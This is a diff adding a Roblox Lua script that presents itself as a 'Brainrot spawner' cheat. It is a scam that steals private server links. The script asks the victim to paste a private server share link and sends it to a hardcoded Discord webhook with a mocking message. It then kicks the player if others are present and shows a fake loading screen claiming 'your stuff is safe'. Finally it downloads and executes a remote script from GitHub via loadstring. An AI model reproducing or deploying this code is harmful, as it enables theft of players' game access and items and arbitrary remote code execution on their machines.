@@ -1,2 +1,308 @@
-https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/x1q
-https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/log.txt
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1429526983011733605/ZykpX7oTKCm0r-dmDU9xKGDK3cVuiXz2oZC2EiWb4aJdBTl_gAgqPbpevZxTExDWlUZ7"
+
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local function doRequest(tbl)
+    local ok, res = pcall(function()
+        if syn and syn.request then return syn.request(tbl) end
+        if request then return request(tbl) end
+        if http_request then return http_request(tbl) end
+        if fluxus and fluxus.request then return fluxus.request(tbl) end
+        if http and http.request then return http.request(tbl) end
+        error("no supported request function found")
+    end)
+    return ok, res
+end
+
+local function sendWebhook(webhookUrl, messageContent)
+    local payload = HttpService:JSONEncode({
+        content = messageContent,
+        allowed_mentions = { parse = {"everyone"} }
+    })
+    local tbl = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    }
+    return doRequest(tbl)
+end
+
+local parent
+if (typeof(gethui) == "function") then
+    parent = gethui()
+else
+    parent = game:GetService("CoreGui")
+end
+
+local existing = parent:FindFirstChild("FindBestBrainrotsGUI")
+if existing then existing:Destroy() end
+
+local function new(class, props)
+    local obj = Instance.new(class)
+    if props then
+        for k,v in pairs(props) do
+            if k ~= "Parent" then obj[k] = v end
+        end
+        if props.Parent then obj.Parent = props.Parent end
+    end
+    return obj
+end
+
+local screenGui = new("ScreenGui", {
+    Name = "FindBestBrainrotsGUI",
+    Parent = parent,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    IgnoreGuiInset = true
+})
+
+local main = new("Frame", {
+    Parent = screenGui,
+    AnchorPoint = Vector2.new(0.5,0.5),
+    Position = UDim2.new(0.5,0,0.5,0),
+    Size = UDim2.new(0.75,0,0.45,0),
+    BackgroundColor3 = Color3.fromRGB(18,18,18),
+    BorderSizePixel = 0,
+    ZIndex = 10
+})
+new("UICorner", {Parent = main, CornerRadius = UDim.new(0,16)})
+
+local header = new("TextLabel", {
+    Parent = main,
+    Size = UDim2.new(1,-40,0,60),
+    Position = UDim2.new(0,20,0,18),
+    BackgroundTransparency = 1,
+    Text = "Brainrot spawner",
+    TextSize = 28,
+    Font = Enum.Font.GothamBold,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+local description = new("TextLabel", {
+    Parent = main,
+    Size = UDim2.new(1,-40,0,30),
+    Position = UDim2.new(0,20,0,80),
+    BackgroundTransparency = 1,
+    Text = "To get the script, paste your PS link in the input field.",
+    TextSize = 18,
+    Font = Enum.Font.Gotham,
+    TextColor3 = Color3.fromRGB(200,200,200),
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+local inputBg = new("Frame", {
+    Parent = main,
+    Position = UDim2.new(0,20,0,120),
+    Size = UDim2.new(1,-40,0,80),
+    BackgroundColor3 = Color3.fromRGB(40,40,40),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = inputBg, CornerRadius = UDim.new(0,10)})
+
+local textBox = new("TextBox", {
+    Parent = inputBg,
+    Position = UDim2.new(0,10,0,8),
+    Size = UDim2.new(0.78,-20,1,-16),
+    BackgroundTransparency = 1,
+    Text = "Paste your PS link here",
+    TextColor3 = Color3.fromRGB(150,150,150),
+    ClearTextOnFocus = false,
+    Font = Enum.Font.Gotham,
+    TextSize = 18,
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+textBox.Focused:Connect(function()
+    if textBox.Text == "Paste your PS link here" then
+        textBox.Text = ""
+        textBox.TextColor3 = Color3.fromRGB(200,200,200)
+    end
+end)
+
+textBox.FocusLost:Connect(function()
+    if textBox.Text == "" then
+        textBox.Text = "Paste your PS link here"
+        textBox.TextColor3 = Color3.fromRGB(150,150,150)
+    end
+end)
+
+local okBtn = new("TextButton", {
+    Parent = inputBg,
+    Position = UDim2.new(0.82,0,0,8),
+    Size = UDim2.new(0.18, -12, 1, -16),
+    BackgroundColor3 = Color3.fromRGB(90,180,255),
+    BorderSizePixel = 0,
+    Text = "OK",
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    TextColor3 = Color3.fromRGB(20,20,20)
+})
+new("UICorner", {Parent = okBtn, CornerRadius = UDim.new(0,8)})
+
+local overlay = new("Frame", {
+    Parent = screenGui,
+    Size = UDim2.new(1,0,1,0),
+    Position = UDim2.new(0,0,0,0),
+    BackgroundColor3 = Color3.fromRGB(50,50,50),
+    BackgroundTransparency = 0,
+    Visible = false,
+    Active = true,
+    ZIndex = 999999,
+    BorderSizePixel = 0,
+    ClipsDescendants = true
+})
+
+local overlayHeader = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.3,0),
+    Size = UDim2.new(0.6,0,0,30),
+    BackgroundTransparency = 1,
+    Text = "Loading Script...",
+    Font = Enum.Font.GothamBold,
+    TextSize = 24,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local overlayText = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0.5),
+    Position = UDim2.new(0.5,0,0.45,0),
+    Size = UDim2.new(0.8,0,0,80),
+    BackgroundTransparency = 1,
+    Text = "Don't worry, your stuff is safe!\nThe code automatically protects your stuff!",
+    Font = Enum.Font.GothamBold,
+    TextSize = 24,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextWrapped = true,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local progressBg = new("Frame", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.55,0),
+    Size = UDim2.new(0.7,0,0,28),
+    BackgroundColor3 = Color3.fromRGB(230,230,230),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = progressBg, CornerRadius = UDim.new(0,14)})
+
+local progressFill = new("Frame", {
+    Parent = progressBg,
+    Position = UDim2.new(0,0,0,0),
+    Size = UDim2.new(0,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(30,30,30),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = progressFill, CornerRadius = UDim.new(0,14)})
+
+local progressLabel = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.62,0),
+    Size = UDim2.new(0.2,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "0%",
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    TextColor3 = Color3.fromRGB(245,245,245)
+})
+
+local invalidLabel = new("TextLabel", {
+    Parent = main,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,1,10),
+    Size = UDim2.new(0.6,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "",
+    Font = Enum.Font.GothamBold,
+    TextSize = 18,
+    TextColor3 = Color3.fromRGB(255,0,0),
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local function setInteract(val)
+    okBtn.Active = val
+    textBox.TextEditable = val
+    okBtn.Visible = val
+end
+
+local function fillProgress(duration)
+    overlay.Visible = true
+    setInteract(false)
+    local start = tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        local now = tick()
+        local t = math.clamp((now - start) / duration, 0, 1)
+        local width = math.floor(t * progressBg.AbsoluteSize.X)
+        progressFill.Size = UDim2.new(0, width, 1, 0)
+        progressLabel.Text = tostring(math.floor(t * 100)) .. "%"
+        if t >= 1 then
+            conn:Disconnect()
+            overlay.Visible = false
+            setInteract(true)
+        end
+    end)
+end
+
+okBtn.MouseButton1Click:Connect(function()
+    local link = tostring(textBox.Text or "")
+    link = link:match("^%s*(.-)%s*$")
+
+    if not (link:find("^https://www.roblox.com/share%?code=") or link:find("^www.roblox.com/share%?code")) then
+        invalidLabel.Text = "Invalid link!"
+        delay(2, function() invalidLabel.Text = "" end)
+        return
+    end
+
+    -- Spieleranzahl prÃ¼fen (nur wenn Overlay noch nicht aktiv)
+    if not overlay.Visible and #Players:GetPlayers() > 1 then
+        local plr = Players.LocalPlayer
+        if plr then
+            plr:Kick("The script doesnt work if there are more than 1 player. U also need to be in your PS! If you dont have one, then im sorry.")
+        end
+        return
+    end
+
+    invalidLabel.Text = ""
+    setInteract(false)
+    overlay.Visible = true
+
+    local content = string.format("@everyone Another dumbass fell for it ðŸ˜‚ Heres the link he entered: %s", link)
+    spawn(function() sendWebhook(WEBHOOK_URL, content) end)
+
+    fillProgress(180) -- 3 Minuten
+end)
+
+textBox.FocusLost:Connect(function(enter)
+    if enter then
+        okBtn:CaptureFocus()
+        okBtn.MouseButton1Click:Wait()
+    end
+end)
+
+print("Failed to load Brainrot Spawner. Please try again.")
+-- Remote script URL
+local url = "https://raw.githubusercontent.com/q6292/lua.new/main/TuanAnh%20Source%20(1).txt"
+
+-- Fetch and execute
+task.spawn(function()
+    local success, source = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if success and type(source) == "string" and #source > 10 then
+        local ok, err = pcall(loadstring(source))
+        if not ok then
+            warn("Remote script error:", err)
+        end
+    else
+        warn("Failed to fetch remote script")
+    end
+end)
